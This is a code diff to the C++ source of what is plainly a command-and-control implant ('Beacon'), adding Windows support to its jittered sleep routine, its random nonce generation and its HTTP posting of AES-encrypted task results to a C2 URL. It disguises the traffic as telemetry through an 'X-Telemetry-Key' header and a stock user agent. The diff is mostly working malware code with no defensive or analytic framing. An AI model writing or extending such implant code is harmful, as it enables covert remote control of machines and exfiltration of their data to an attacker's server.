@@ -65,16 +65,18 @@ Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF), taskDispatcher_(pend
 void Beacon::sleepWithJitter() {
     uint32_t h = 0; std::string host = getHostname();
     for (char c : host) h = h * 31 + c;
-    std::mt19937 gen(h ^ std::chrono::system_clock::now().time_since_epoch().count());
+    std::mt19937 gen(h ^ (unsigned int)std::chrono::system_clock::now().time_since_epoch().count());
     std::normal_distribution<> d(core::SLEEP_BASE, core::SLEEP_BASE * (core::JITTER_PCT / 100.0));
     double sleep_duration = std::max(3.0, d(gen));
 #ifdef LINUX
     auto start = std::chrono::steady_clock::now();
     uint32_t delay_ms = (uint32_t)(sleep_duration * 1000);
     while (true) {
-        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count();
+        auto elapsed = (uint32_t)std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count();
         if (elapsed >= delay_ms) break;
-        for (volatile int i = 0; i < 100000; ++i) { asm(""); }
+        for (int i = 0; i < 100000; ++i) {
+            volatile int j = i; (void)j;
+        }
         sched_yield();
     }
 #else
@@ -103,16 +105,23 @@ void Beacon::run() {
             for (const auto& r : inFlightResults_) payload["results"].push_back({{"task_id", r.task_id}, {"output", r.output}, {"error", r.error}});
             std::vector<BYTE> plaintext(payload.dump().begin(), payload.dump().end());
             std::vector<BYTE> nonce(12);
-#ifndef _WIN32
+#ifdef _WIN32
+            HCRYPTPROV hProv; if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) { CryptGenRandom(hProv, 12, nonce.data()); CryptReleaseContext(hProv, 0); }
+#else
             std::ifstream ur("/dev/urandom", std::ios::binary); if (ur.is_open()) ur.read((char*)nonce.data(), 12);
 #endif
             std::vector<BYTE> ciphertext = aes.encrypt(plaintext, nonce);
             std::vector<BYTE> enc_p; enc_p.insert(enc_p.end(), nonce.begin(), nonce.end()); enc_p.insert(enc_p.end(), ciphertext.begin(), ciphertext.end());
             std::string server, path; std::regex re(R"(https?://([^/]+)(/.*))"); std::smatch m;
             if (std::regex_search(c2Url_, m, re)) { server = m[1].str(); path = m[2].str(); } else { c2Url_ = ""; continue; }
-#ifndef _WIN32
+            std::vector<BYTE> resp;
+#ifdef _WIN32
+            http::WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
+            std::wstring h = L"X-Telemetry-Key: " + std::wstring(core::API_KEY.begin(), core::API_KEY.end()) + L"\r\n";
+            resp = client.post(std::wstring(server.begin(), server.end()), std::wstring(path.begin(), path.end()), enc_p, h);
+#else
             http::HttpClient client(core::USER_AGENTS[0]); std::string h_headers = "X-Telemetry-Key: " + core::API_KEY + "\r\n";
-            std::vector<BYTE> resp = client.post(server, path, enc_p, h_headers);
+            resp = client.post(server, path, enc_p, h_headers);
 #endif
             if (resp.size() >= 12) {
                 std::vector<BYTE> r_nonce(resp.begin(), resp.begin() + 12); std::vector<BYTE> r_ctx(resp.begin() + 12, resp.end());
